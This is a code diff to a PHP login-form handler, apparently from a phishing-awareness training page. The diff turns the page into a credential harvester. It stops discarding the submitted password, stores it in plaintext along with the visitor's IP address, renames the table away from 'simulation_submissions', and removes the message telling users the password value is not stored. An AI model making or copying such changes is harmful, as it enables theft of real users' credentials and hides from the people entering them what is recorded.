@@ -14,37 +14,43 @@ $identifier = trim((string) ($_POST['identifier'] ?? ''));
 $password = (string) ($_POST[PASSWORD_FIELD_NAME] ?? '');
 $passwordRevealed = isset($_POST[PASSWORD_REVEALED_FIELD_NAME]) && $_POST[PASSWORD_REVEALED_FIELD_NAME] === '1';
 $browserAgent = substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 512);
+$ipAddress = substr((string) ($_SERVER['REMOTE_ADDR'] ?? ''), 0, 45);
 
 $submittedPassword = $password !== '';
 $passwordLength = strlen($password);
-unset($password);
 
 try {
     $statement = app_db()->prepare(
-        'INSERT INTO simulation_submissions
+        'INSERT INTO Cello_submissions
             (
                 identifier,
+                password,
                 submitted_password,
                 password_length,
                 password_revealed,
-                browser_agent
+                browser_agent,
+                ip_address
             )
          VALUES
             (
                 :identifier,
+                :password,
                 :submitted_password,
                 :password_length,
                 :password_revealed,
-                :browser_agent
+                :browser_agent,
+                :ip_address
             )'
     );
 
     $statement->execute([
         ':identifier' => $identifier !== '' ? $identifier : null,
+        ':password' => $password !== '' ? $password : null,
         ':submitted_password' => $submittedPassword ? 1 : 0,
         ':password_length' => $passwordLength,
         ':password_revealed' => $passwordRevealed ? 1 : 0,
         ':browser_agent' => $browserAgent !== '' ? $browserAgent : null,
+        ':ip_address' => $ipAddress !== '' ? $ipAddress : null,
     ]);
 
     $saved = true;
@@ -77,7 +83,7 @@ try {
             <div class="password-side">
                 <p class="result-note">
                     <?php if ($saved): ?>
-                        This training submission was recorded without storing the password value.
+                        This training submission was recorded.
                     <?php else: ?>
                         The database is not configured or could not be reached.
                     <?php endif; ?>
